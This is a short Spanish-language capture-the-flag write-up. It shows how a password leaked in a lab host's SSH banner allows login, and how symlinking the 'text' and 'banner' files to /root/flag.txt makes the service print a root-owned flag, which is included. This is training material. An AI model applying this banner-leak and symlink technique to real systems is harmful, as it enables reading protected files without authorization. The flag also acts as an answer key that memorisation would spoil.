Can you abuse the banner?
## Solución
Primero revise el banner de la maquina para ver si habia alguna fuga de informacion:

```
┌──(dastruker㉿MSI)-[/mnt/c/Users/adomi]
└─$ nc xebec.cylabacademy.net 30287
SSH-2.0-OpenSSH_9.6p1 My_Passw@rd_@1234
```

Ahi encontre la contraseña guardada en el texto del servicio. Luego inicie la conexion interactiva para entrar a la terminal contestando las preguntas:

```
┌──(dastruker㉿MSI)-[/mnt/c/Users/adomi]
└─$ nc xebec.cylabacademy.net 11572
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John
player@challenge:~$
```

Ya adentro del sistema borre los archivos `text` y `banner` y cree accesos directos (_symlinks_) apuntando al archivo `/root/flag.txt`:

```
player@challenge:~$ rm -f text banner
player@challenge:~$ ln -s /root/flag.txt text
player@challenge:~$ ln -s /root/flag.txt banner
```

Al volver a conectarme en otra terminal, la aplicacion intento leer la bienvenida desde mi acceso directo y me mostro la flag directamente en la pantalla:

```
┌──(dastruker㉿MSI)-[/mnt/c/Users/adomi]
└─$ nc xebec.cylabacademy.net 11572
academy{b4nn3r_gr4bb1n9_su((3sfu11y_32c8192b}
```
## Notas Adicionales


## Referencias
